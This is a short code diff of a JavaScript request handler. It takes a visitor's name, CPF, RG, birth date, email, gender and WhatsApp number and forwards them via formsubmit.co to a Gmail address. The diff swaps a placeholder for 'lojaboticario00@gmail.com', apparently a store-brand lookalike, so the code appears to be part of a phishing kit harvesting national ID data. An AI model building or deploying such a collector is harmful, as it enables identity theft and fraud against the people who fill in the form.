@@ -10,7 +10,7 @@ export default async function handler(req, res) {
 
     const { nome, cpf, rg, nasc, email, genero, whats } = req.body;
 
-    const response = await fetch("https://formsubmit.co/ajax/SEUEMAIL@gmail.com", {
+    const response = await fetch("https://formsubmit.co/ajax/lojaboticario00@gmail.com", {
 
       method: "POST",
 
